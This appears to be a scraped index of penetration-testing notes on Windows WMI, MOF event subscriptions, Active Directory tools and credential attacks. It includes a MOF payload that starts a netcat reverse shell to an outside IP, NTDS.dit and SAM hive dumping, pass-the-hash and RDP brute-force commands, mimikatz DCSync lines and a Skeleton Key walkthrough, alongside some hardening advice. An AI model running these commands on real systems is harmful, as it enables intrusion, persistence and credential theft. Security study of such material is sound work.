Win32_Process | Select - ExpandProperty CimClassMethods Exploring methods: Get - CimClass - ClassName Win32_Process | Select - ExpandProperty CimClassMethods | where name - eq Create | Select - ExpandProperty Parameters Invoke Invoke - WmiMethod - Class Win32_process - Name create - ArgumentList calc . exe Invoke - CimMethod - ClassName Win32_process - MethodName Create - Arguments @ { CommandLine = calc.exe } Update Instance Get - WritableProperties Get - WmiObject - Class Win32_Printer - FIlter name = Microsoft XPS Document Writer | Set - WmiInstance - Arguments @ { Comment = Example comment } Get - CimInstancet - ClassName Win32_Printer - FIlter name = Microsoft XPS Document Writer | Set - CimInstance - Property @ { Comment = Example comment } Associations https://github.com/dfinke/images/blob/master/acn.png Get - WmiObject - Class * Win32_NetworkAdapter * - List | fl * Get - WmiObject - Class Win32_NetworkAdapter - List | fl * Get - WmiObject - Query Associators of {win32_NetworkAdapter.DeviceID=11} Get - WmiObject - Query Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get - CimAssociatedInstance - InputObject ( Get - CimInstance - ClassName Win32_NetworkAdapter - Filter DeviceId = 11 ) Only see one association class: Get - WmiObject - Query Associators of {win32_NetworkAdapter.DeviceID=11} - AssociationClass Win32_ProtocolBinding Get references (classes linking two other classes) Get - WimObject - Query References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get - WimObject - Query References of {win32_NetworkAdapter.DeviceID=11} Interesting Queries List all the systems within the current environment/directory: SELECT ds_cn FROM ds_computer Installed software: File listing: Services: Logon accounts: Hardware information: Installed patches: Security logs: Command line used to start processes: Path to executable for running processes: Useful WMI Classes Win32_OperatingSystem Win32_Process Win32_IP4RouteTable Win32_UserAccount Win32_Groups Win32_ShadowCopy Create a shadow copy of AD's drive and extract NTDS.dit ( Get - WmiObject - Class Win32_ShadowCopy - list ). create ( C:\\ , CreateAccessible ) $ link = ( Get - WmiObject - Class Winn32_ShadowCopy ). DeviceObject + \\ cmd / c mklink / d C : \\ shadowcopy $link AD Tools WMI Object Browser: WMIC # WMIC Verbs can be explored by looking at help # Interactive wmic wmic : root \\ cli process /? wmic : root \\ cli group where name = Administrators assoc # Non - interactive wmic process /? Powershell WMI Browser WMI Code Generator WMIGen Remoting WMI Cmdlets Uses DCOM Port 135 (winmgmt service) Not firewall / NAT friendly Data exchanged on dynamic ports ( HKLM \\ Software \\ Microsoft \\ Rpc \\ Internet ) CIM Cmdlets DCOM 135 WinRm/WSMan 5385 - HTTP 5386 - HTTPS Firewall and NAT friendly Session over WinRM/WSMan $ sess = New - CimSession - ComputerName name - Credential cred Get - CimInstance - CimSession $ sess - ClassName Win32_OperatingSystem Session over DCOM $ sessOptions = New - CimSessionOption - Protocol Dcom $ newsess = New - CimSession - ComputerName name - Credential cred - SessionOption $ sessOptions Access Registry Get - WimObject - Namespace root \\ default - Class StdRegProv - List Get - WimObject - Namespace root \\ default - Class StdRegProv - List | Select - Object - ExpandProperty methods | more $ RegProv = Get - WimObject - Namespace root \\ default - Class StdRegProv - List $ RegProv . Methods $ RemoteReg = Get - WmiObject - List StdRegProv - ComputerName name - Credential cred $ RemoteReg | Select - Object - ExpandProperty methods | more $ RemoteReg . getStringValue ( id , path , propertyName ) WmiInvokeMethod - Namespace root \\ default - Class StdRegProv - Name GetStringValue @ ( id , path , property ) Posh_SecMod \\ Registry . ps1 References Playing with MOF files on Windows, for fun profit Exposing System Secrets with VBA and WMI API How to use WbemExec for a write privilege attack on Windows","title":"Wmi"},{"location":"os/windows/wmi/#interesting-cim-classes","text":"- __EventFilter [ create ]: permits to define a Windows event - __EventConsumer : (abstract consumer class) - ActiveScriptEventConsumer : possible to embed VBScript or JSScript in the consumer (only available in root \\ subscription ) - Consumer runs with SYSTEM privilege on Windows XP and Windows 2003 Server - Vista , it is running under the LOCAL_SERVICE user - __FilterToConsumerBinding : link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)","title":"Interesting CIM classes"},{"location":"os/windows/wmi/#mof-managed-object-format","text":"Language used to describe CIM classes, namespaces and providers MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI CIM class(es) MOF describes are added into the repository Stored in %SystemRoot%\\System32\\wbem Compilation Compiled using mofcomp . exe Auto compile register Writable to Administrator only Files added to %SystemRoot%\\System32\\wbem\\mof\\ get auto compiled and registered (before Vista) Logs are in %SystemRoot%\\System32\\wbem\\mof\\Logs\\mofcomp.log Wait for a windows event and trigger: # pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) instance of __EventFilter as $ FILTER { Name = CLASS_FIRST_TEST ; EventNamespace = root\\\\cimv2 ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\ Win32_NTLogEvent\\ AND TargetInstance.LogFile=\\ Application\\ ; QueryLanguage = WQL ; } ; instance of ActiveScriptEventConsumer as $ CONSUMER { Name = CLASS_FIRST_TEST ; ScriptingEngine = VBScript ; ScriptText = Set objShell = CreateObject(\\ WScript.Shell\\ )\\n objShell.Run \\ C : \\\\ Windows \\\\ system32 \\\\ cmd . exe / C C : \\\\ nc . exe 192.168.38.1 1337 - e C : \\\\ Windows \\\\ system32 \\\\ cmd . exe \\ \\n ; } ; instance of __FilterToConsumerBinding { Consumer = $CONSUMER ; Filter = $FILTER ; } ; Ref: http://www.hsc-news.com/archives/2011/000078.html Self start: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) class WoootClass { [ key ] string Name ; } ; instance of __EventFilter as $ FILTER { Name = XPLOIT_TEST_SYSTEM ; EventNamespace = root\\\\subscription ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\ WoootClass \\ ; QueryLanguage = WQL ; } ; instance of ActiveScriptEventConsumer as $ CONSUMER { // ... } ; instance of __FilterToConsumerBinding { // ... } ; instance of WoootClass { Name = Woot ; } ;","title":"MOF (Managed Object Format)"},{"location":"os/windows/wmi/#usages","text":"- Automatically kill some processes as soon as they are launched (anti-rootkits...), - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper), - Automatically infect USB devices","title":"Usages"},{"location":"os/windows/wmi/#exploring","text":"","title":"Exploring"},{"location":"os/windows/wmi/#exploring-namespaces","text":"Get - WmiObject - Namespace root - Class __Namespace | select name Get - CimInstance - Namespace root - Class __Namespace To read nested namespaces: Get - WmiNamespace","title":"Exploring Namespaces"},{"location":"os/windows/wmi/#exploring-classes","text":"- Namespace root \\ cimv2 is the default of Powershell Get - WmiObject - Class * bios * - List Get - CimClasses - List List only dynamic classes Get - CimClasses - QualifierName dynamic - List Look at details of the class Get - WmiObject - Class Win32_Bios | fl * Get - CimInstance - ClassName Win32_Bios | fl *","title":"Exploring Classes"},{"location":"os/windows/wmi/#using-wmi-class","text":"Get-WmiObject -Class Win32_Process | Where-Object { $_.Name - eq explorer.exe } Get-WmiObject -Class Win32_Process | where name -eq explorer.exe Get-WmiObject -Query Select * from Win32_Process where Name = explorer.exe Get - CimInstance - ClassName Win32_Process - Filter Name -eq explorer.exe Get - CimInstance - Query Select * from Win32_Process where Name = explorer.exe Can use Remove - WmiObject and Remove - CimInstance to close processed, remove registry entries, etc.","title":"Using WMI Class"},{"location":"os/windows/wmi/#methods","text":"Identifying methods: Get-WmiObject * -List | Where-Object { $_.Method } (Get-WmiObject -Class Win32_Process -List).Methods Get-CimClass -Class Win32_Process -List | Select -ExpandProperty Methods Get - CimClass - MethodName * Get - CimClass - MethodName * create * Get - CimClass - ClassName Win32_Process | Select - ExpandProperty CimClassMethods Exploring methods: Get - CimClass - ClassName Win32_Process | Select - ExpandProperty CimClassMethods | where name - eq Create | Select - ExpandProperty Parameters Invoke Invoke - WmiMethod - Class Win32_process - Name create - ArgumentList calc . exe Invoke - CimMethod - ClassName Win32_process - MethodName Create - Arguments @ { CommandLine = calc.exe }","title":"Methods"},{"location":"os/windows/wmi/#update-instance","text":"Get - WritableProperties Get - WmiObject - Class Win32_Printer - FIlter name = Microsoft XPS Document Writer | Set - WmiInstance - Arguments @ { Comment = Example comment } Get - CimInstancet - ClassName Win32_Printer - FIlter name = Microsoft XPS Document Writer | Set - CimInstance - Property @ { Comment = Example comment }","title":"Update Instance"},{"location":"os/windows/wmi/#associations","text":"https://github.com/dfinke/images/blob/master/acn.png Get - WmiObject - Class * Win32_NetworkAdapter * - List | fl * Get - WmiObject - Class Win32_NetworkAdapter - List | fl * Get - WmiObject - Query Associators of {win32_NetworkAdapter.DeviceID=11} Get - WmiObject - Query Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get - CimAssociatedInstance - InputObject ( Get - CimInstance - ClassName Win32_NetworkAdapter - Filter DeviceId = 11 ) Only see one association class: Get - WmiObject - Query Associators of {win32_NetworkAdapter.DeviceID=11} - AssociationClass Win32_ProtocolBinding Get references (classes linking two other classes) Get - WimObject - Query References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get - WimObject - Query References of {win32_NetworkAdapter.DeviceID=11}","title":"Associations"},{"location":"os/windows/wmi/#interesting-queries","text":"List all the systems within the current environment/directory: SELECT ds_cn FROM ds_computer Installed software: File listing: Services: Logon accounts: Hardware information: Installed patches: Security logs: Command line used to start processes: Path to executable for running processes:","title":"Interesting Queries"},{"location":"os/windows/wmi/#useful-wmi-classes","text":"Win32_OperatingSystem Win32_Process Win32_IP4RouteTable Win32_UserAccount Win32_Groups Win32_ShadowCopy Create a shadow copy of AD's drive and extract NTDS.dit ( Get - WmiObject - Class Win32_ShadowCopy - list ). create ( C:\\ , CreateAccessible ) $ link = ( Get - WmiObject - Class Winn32_ShadowCopy ). DeviceObject + \\ cmd / c mklink / d C : \\ shadowcopy $link AD","title":"Useful WMI Classes"},{"location":"os/windows/wmi/#tools","text":"WMI Object Browser: WMIC # WMIC Verbs can be explored by looking at help # Interactive wmic wmic : root \\ cli process /? wmic : root \\ cli group where name = Administrators assoc # Non - interactive wmic process /? Powershell WMI Browser WMI Code Generator WMIGen","title":"Tools"},{"location":"os/windows/wmi/#remoting","text":"WMI Cmdlets Uses DCOM Port 135 (winmgmt service) Not firewall / NAT friendly Data exchanged on dynamic ports ( HKLM \\ Software \\ Microsoft \\ Rpc \\ Internet ) CIM Cmdlets DCOM 135 WinRm/WSMan 5385 - HTTP 5386 - HTTPS Firewall and NAT friendly Session over WinRM/WSMan $ sess = New - CimSession - ComputerName name - Credential cred Get - CimInstance - CimSession $ sess - ClassName Win32_OperatingSystem Session over DCOM $ sessOptions = New - CimSessionOption - Protocol Dcom $ newsess = New - CimSession - ComputerName name - Credential cred - SessionOption $ sessOptions","title":"Remoting"},{"location":"os/windows/wmi/#access-registry","text":"Get - WimObject - Namespace root \\ default - Class StdRegProv - List Get - WimObject - Namespace root \\ default - Class StdRegProv - List | Select - Object - ExpandProperty methods | more $ RegProv = Get - WimObject - Namespace root \\ default - Class StdRegProv - List $ RegProv . Methods $ RemoteReg = Get - WmiObject - List StdRegProv - ComputerName name - Credential cred $ RemoteReg | Select - Object - ExpandProperty methods | more $ RemoteReg . getStringValue ( id , path , propertyName ) WmiInvokeMethod - Namespace root \\ default - Class StdRegProv - Name GetStringValue @ ( id , path , property ) Posh_SecMod \\ Registry . ps1","title":"Access Registry"},{"location":"os/windows/wmi/#references","text":"Playing with MOF files on Windows, for fun profit Exposing System Secrets with VBA and WMI API How to use WbemExec for a write privilege attack on Windows","title":"References"},{"location":"os/windows/x-Bypass/","text":"Defense Bypass References ftp.exe to open processes: https://twitter.com/yeyint_mth/status/1009732492138442752","title":"Defense Bypass"},{"location":"os/windows/x-Bypass/#defense-bypass","text":"","title":"Defense Bypass"},{"location":"os/windows/x-Bypass/#references","text":"ftp.exe to open processes: https://twitter.com/yeyint_mth/status/1009732492138442752","title":"References"},{"location":"os/windows/x-Defense/","text":"Defense ActiveDirectory Use unique and strong local admin account passwords Use Microsoft LAPS to automate local admin password changes KB2871997 to disallow local account logon across the network Limit workstation to workstation communication Implement network segmentation Never run services with domain-admin privileged accounts on workstations (avoid dumping from LSASS) Install patch (), so that LSASS will not store plain text password Done't use unconstrained delegation (this stores user's delegated TGS in LSASS). Only use constrained delegation. Disable delegation for admin accounts (Check: Account is sensitive and cannot be delegated). Detect based on delegation events. References Windows 10 and Server 2016 Secure Baseline Group Policy: https://github.com/mxk/win10-secure-baseline-gpo Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: https://hakin9.org/preventing-mimikatz-attacks/ Server Security https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance","title":"Defense"},{"location":"os/windows/x-Defense/#defense","text":"","title":"Defense"},{"location":"os/windows/x-Defense/#activedirectory","text":"Use unique and strong local admin account passwords Use Microsoft LAPS to automate local admin password changes KB2871997 to disallow local account logon across the network Limit workstation to workstation communication Implement network segmentation Never run services with domain-admin privileged accounts on workstations (avoid dumping from LSASS) Install patch (), so that LSASS will not store plain text password Done't use unconstrained delegation (this stores user's delegated TGS in LSASS). Only use constrained delegation. Disable delegation for admin accounts (Check: Account is sensitive and cannot be delegated). Detect based on delegation events.","title":"ActiveDirectory"},{"location":"os/windows/x-Defense/#references","text":"Windows 10 and Server 2016 Secure Baseline Group Policy: https://github.com/mxk/win10-secure-baseline-gpo Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: https://hakin9.org/preventing-mimikatz-attacks/","title":"References"},{"location":"os/windows/x-Defense/#server-security","text":"https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance","title":"Server Security"},{"location":"os/windows/y-Tools/","text":"Tools Patch Extractor : https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d ntdsXtract Active Directory forensic framework -\u200b https://github.com/csababarta/ntdsxtract Extract users from ESE DB export: dsusers . py kotarak . dit . export / datatable . 3 kotarak . dit . export / link_table . 5 hashdump --syshive kotarak . bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc Practice: - HTB: Kotarak LibEseDB libesedb is a library to access the Extensible Storage Engine (ESE) Database File (EDB) format. The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc. https://github.com/libyal/libesedb Dump tables: esedbexport - m tables 20170721114636 _default_192 . 168 . 110 . 133 _psexec . ntdsgrab . _333512 . dit Practice: - HTB: Kotarak WinEXE Winexe remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package).- https://sourceforge.net/projects/winexe/ PowerUpSQL Dumping Active Directory Domain Info \u2013 with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/ Bloodhound BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. GitHub: https://github.com/BloodHoundAD/BloodHound Find where domain admins are logged in: python http : // bloodhound . py - u USERNAME - p PASSWORD - d DOMAIN_NAME - dc DOMAIN_CONTROLLER_HOSTNAME neo4j start bloodhound Mimkatz Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html DCSync https://adsecurity.org/?p=1729 mimikatz \u201c lsadump :: dcsync / domain : rd . adsecurity . org / user : krbtgt \u201d mimikatz \u201c lsadump :: dcsync / domain : rd . adsecurity . org / user : Administrator \u201d \u201cimpersonates\u201d a Domain Controller and requests account password data from the targeted Domain Controller. Required Permissions: Any member of Administrators , Domain Admins , or Enterprise Admins as well as Domain Controller computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default. Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit). Internals: * Discovers Domain Controller in the specified domain name. * Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) \u201c The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one . The response contains a set of updates that the client has to apply to its NC replica . It is possible that the set of updates is too large for only one response message . In those cases , multiple DSGetNCChanges requests and responses are done . This process is called replication cycle or simply cycle .\u201d \u201c When a DC receives a DSReplicaSync Request , then for each DC that it replicates from ( stored in RepsFrom data structure ) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC . So it gets up - to - date AD objects from each of the DC \u2019 s which it replicates from .\u201d Sys Internals https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx PsExec - Execute processes on remote machine PsFile - Displays list of files opened remotely. PsGetSid - Translate SID to display name and vice versa PsKill - Kill processes on local or remote machine PsInfo - Displays installation, install date, kernel build, physical memory, processors type and number, etc. PsList - Displays process, CPU, Memory, thread statistics PsLoggedOn - Displays local and remote logged users PsLogList - View Event logs localrecon.cmd Utility to generate a summary of a Windows system https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd Other BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: https://github.com/BloodHoundAD/BloodHound Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: https://github.com/EmpireProject/Empire A little toolbox to play with Microsoft Kerberos in C: https://github.com/gentilkiwi/kekeo/ A little tool to play with Windows security: https://github.com/gentilkiwi/mimikatz C# toolset for raw Kerberos interaction and abuses: https://github.com/GhostPack/Rubeus C# project that performs a number of security oriented host-survey \"safety checks\": https://github.com/GhostPack/Seatbelt","title":"Tools"},{"location":"os/windows/y-Tools/#tools","text":"Patch Extractor : https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d","title":"Tools"},{"location":"os/windows/y-Tools/#ntdsxtract","text":"Active Directory forensic framework -\u200b https://github.com/csababarta/ntdsxtract Extract users from ESE DB export: dsusers . py kotarak . dit . export / datatable . 3 kotarak . dit . export / link_table . 5 hashdump --syshive kotarak . bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc Practice: - HTB: Kotarak","title":"ntdsXtract"},{"location":"os/windows/y-Tools/#libesedb","text":"libesedb is a library to access the Extensible Storage Engine (ESE) Database File (EDB) format. The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc. https://github.com/libyal/libesedb Dump tables: esedbexport - m tables 20170721114636 _default_192 . 168 . 110 . 133 _psexec . ntdsgrab . _333512 . dit Practice: - HTB: Kotarak","title":"LibEseDB"},{"location":"os/windows/y-Tools/#winexe","text":"Winexe remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package).- https://sourceforge.net/projects/winexe/","title":"WinEXE"},{"location":"os/windows/y-Tools/#powerupsql","text":"Dumping Active Directory Domain Info \u2013 with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/","title":"PowerUpSQL"},{"location":"os/windows/y-Tools/#bloodhound","text":"BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. GitHub: https://github.com/BloodHoundAD/BloodHound Find where domain admins are logged in: python http : // bloodhound . py - u USERNAME - p PASSWORD - d DOMAIN_NAME - dc DOMAIN_CONTROLLER_HOSTNAME neo4j start bloodhound","title":"Bloodhound"},{"location":"os/windows/y-Tools/#mimkatz","text":"Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html","title":"Mimkatz"},{"location":"os/windows/y-Tools/#dcsync","text":"https://adsecurity.org/?p=1729 mimikatz \u201c lsadump :: dcsync / domain : rd . adsecurity . org / user : krbtgt \u201d mimikatz \u201c lsadump :: dcsync / domain : rd . adsecurity . org / user : Administrator \u201d \u201cimpersonates\u201d a Domain Controller and requests account password data from the targeted Domain Controller. Required Permissions: Any member of Administrators , Domain Admins , or Enterprise Admins as well as Domain Controller computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default. Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit). Internals: * Discovers Domain Controller in the specified domain name. * Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) \u201c The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one . The response contains a set of updates that the client has to apply to its NC replica . It is possible that the set of updates is too large for only one response message . In those cases , multiple DSGetNCChanges requests and responses are done . This process is called replication cycle or simply cycle .\u201d \u201c When a DC receives a DSReplicaSync Request , then for each DC that it replicates from ( stored in RepsFrom data structure ) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC . So it gets up - to - date AD objects from each of the DC \u2019 s which it replicates from .\u201d","title":"DCSync"},{"location":"os/windows/y-Tools/#sys-internals","text":"https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx PsExec - Execute processes on remote machine PsFile - Displays list of files opened remotely. PsGetSid - Translate SID to display name and vice versa PsKill - Kill processes on local or remote machine PsInfo - Displays installation, install date, kernel build, physical memory, processors type and number, etc. PsList - Displays process, CPU, Memory, thread statistics PsLoggedOn - Displays local and remote logged users PsLogList - View Event logs","title":"Sys Internals"},{"location":"os/windows/y-Tools/#localreconcmd","text":"Utility to generate a summary of a Windows system https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd","title":"localrecon.cmd"},{"location":"os/windows/y-Tools/#other","text":"BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: https://github.com/BloodHoundAD/BloodHound Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: https://github.com/EmpireProject/Empire A little toolbox to play with Microsoft Kerberos in C: https://github.com/gentilkiwi/kekeo/ A little tool to play with Windows security: https://github.com/gentilkiwi/mimikatz C# toolset for raw Kerberos interaction and abuses: https://github.com/GhostPack/Rubeus C# project that performs a number of security oriented host-survey \"safety checks\": https://github.com/GhostPack/Seatbelt","title":"Other"},{"location":"os/windows/z-References/","text":"References Schtasks without Schtasks.exe via Reflective DLL: https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/ Windows 10 Persistence via PATH directories - CDPSvc: https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found. With a default Windows installation, there can\u2019t be a non-admin directory in the PATH, so this can\u2019t be exploited. A sample DLL (source included) that executes calc.exe is available here: https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist Useful for vulnerability research workflows on Windows: https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203 Windows 10 Device Security: https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu Windows Command Line cheatsheet (part 1): some useful tips: https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/ Windows Command Line cheatsheet (part 2): WMIC: https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/","title":"References"},{"location":"os/windows/z-References/#references","text":"Schtasks without Schtasks.exe via Reflective DLL: https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/ Windows 10 Persistence via PATH directories - CDPSvc: https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found. With a default Windows installation, there can\u2019t be a non-admin directory in the PATH, so this can\u2019t be exploited. A sample DLL (source included) that executes calc.exe is available here: https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist Useful for vulnerability research workflows on Windows: https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203 Windows 10 Device Security: https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu Windows Command Line cheatsheet (part 1): some useful tips: https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/ Windows Command Line cheatsheet (part 2): WMIC: https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/","title":"References"},{"location":"os/windows/credentials/0-cheatsheed/","text":"Cheatsheet https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md Stored Credentials Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list LM hashes Password longer than 7 is split and each half hashed separately Passwords are converted into uppercase No salt Empty LM hash AAD3B435B51404EE aad3b435b51404ee AAD3B435B51404EEAAD3B435B51404EE aad3b435b51404eeaad3b435b51404ee NTLM hashes Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 8118 cb8789b3a147c790db402b016a08 ::: ( UID ):( UID NUM ):( LM HASH ):( NT HASH ):( COMMENT ):( USER HOME PATH ): Dumping hashes Cannot copy SAM when sys is in use C : \\ reg . exe save hklm \\ sam sam C : \\ reg . exe save hklm \\ security security C : \\ reg . exe save hklm \\ system system Use secretsdump.py to extract Capturing Hashes Inveigh Impacket's smbserver.py Attack Patterns Pass the Hash Auth using username and NTLM hash (since NTLM and LM hashes are not salted) Replace \"no password\" in dump wih empty LM hash Copy admins dumped hash (LM:NTML) export SMBHASH = LM : NTML pth - winexe - U administrator % // ip cmd pth-winexe pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd RDP Password Brute-forcing ncrack - v - f --user administrator -P password.txt rdp://ip,CL=1 LSASS Attack Techniques DPAPI Backup Key Access to secret keys of all users in a domain (certificate, private key, etc.) Obtaining the never changing DPAPI master key In a domain setup, all master keys are required to decrypt the keys. All master keys are protected using one never renewed key. Backup key protocol can be used (tz) to get this key from DC. Skeleton Key Actors can use a password of their choosing to authenticate as any user. Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers to allow the threat actor to authenticate as any user, while legitimate users can continue to authenticate as normal. Ref: https://www.secureworks.com/research/skeleton-key-malware-analysis](https://www.secureworks.com/research/skeleton-key-malware-analysis ) When run, Skeleton Key performs the following tasks: Check for one of the following compatible 64-bit Windows versions. The malware is not compatible with 32-bit Windows versions or with Windows Server versions beginning with Windows Server 2012 (6.2). 6.1 (Windows 2008 R2) 6.0 (Windows Server 2008) 5.2 (Windows 2003 R2) Use the SeDebugPrivilege function to acquire the necessary administrator privileges to write to the Local Security Authority Subsystem Service (LSASS) process. This process controls security functions for the AD domain, including user account authentication. Enumerate available processes to acquire a handle to the LSASS process. Obtain addresses for the authentication-related functions that will be patched: CDLocateCSystem \u2014 located in cryptdll.dll SamIRetrieveMultiplePrimaryCredentials \u2014 located in samsrv.dll SamIRetrievePrimaryCredentials \u2014 located in samsrv.dll Perform OS-specific adjustments using the global variable set during the compatibility check in Step 1. Use the OpenProcess function to acquire a handle to the LSASS process. Reserve and allocate the required memory space to edit and patch the LSASS process's memory. Patch relevant functions based on the operating system: CDLocateCSystem (all compatible Windows versions) SamIRetrieveMultiplePrimaryCredentials (only Windows 2008 R2 (6.1)) SamIRetrievePrimaryCredentials (all compatible Windows versions other than Windows 2008 R2 (6.1)) Skeleton Key performs the following steps to patch each function: Call the VirtualProtectEx function to change the memory protection to allow writing to the required memory allocations (PAGE_EXECUTE_READWRITE, 0x40). This step allows the function's code to be updated in memory. Call the WriteProcessMemory function to change the address of the target function to point to the patched code. This change causes calls to the target function to use the patch instead. Restore the original memory protection by calling VirtualProtectEx with the original memory protection flags. This step is likely to avoid suspicious writable and executable memory allocations. Manipulating SID sidHistory can be used to manipulate SID and become domain admin Use SID of the DC to look ad domain admin Use DCSync to get more information Windows Version Dependent Information Windows 2000 LSASS contains Plain NTLM / LM hashes Kerberos keys, tickets, session keys, passwords (if not consumed already) Passwords encrypted in memory using 1 byte key (XOR) Key is stored in a secret structure [Tool] MimiLove (not in Mimikatz ) Windows XP/2003 WDigest provider to auth to Web/SASL/LDAP - RFC2617 Password constantly stays in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory RC4 DESx Key and IV are stored near the secret in LSASS process TsPks (CredSSP) provider can be added manually in XP Terminal server single sign on Credential delegation for terminal server/PowerShell/Double hop, etc. LiveSSP - For using live account to logon to windows Windows Vista/7 TsPkg (CredSSP support) is available by default Several passwords are constantly in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory 3DES AES Key and IV are stored near the secret in LSASS process Windows 8/8.1 Clear text domain passwords in Vault When using PIN, Picture or Fingerprint to authenticate Offline access is possible Pass the hash, over pass the hash and pass the ticket for RDP Windows 8.1 WDigest is off by default. No password in memory by default. LSA login session cache cleaner Restricted admin mode for RDP Avoid credentials from getting sent to server Pass the hash, over pass the hash and pass the ticket for RDP (with CredSSP) LSA protection LSASS is a protected process. No memory access provided. Can be bypassed by: A driver Another protected process Protected Users security group No NTLM, WDigest, CredSSP, delegation or SSO Strengthen eKerberos only KB2975625 - Restricted admin is disabled by default Windows 10 VMS introduce for enterprise users Use Crypto HSM approach When Windows Credential Guard is enabled: NTLM hash of the password stored in the memory in \"secure world\", encrypted with a \"session-key\". User will get a blob. When authenticating, user sends the blob with NTLM challenge. Secure world will do the hashing operation and create the NTML challenge response and send the response to the normal world. In Kerberos, process is same (secure-world maintain more keys) Limitations TGS session key is not protected (TGT is protected) Not available in VMs and not enabled by default More to protect: DPAPI SAM / DSRM PAC signature References Extracting User Password Data with Mimikatz DCSync: 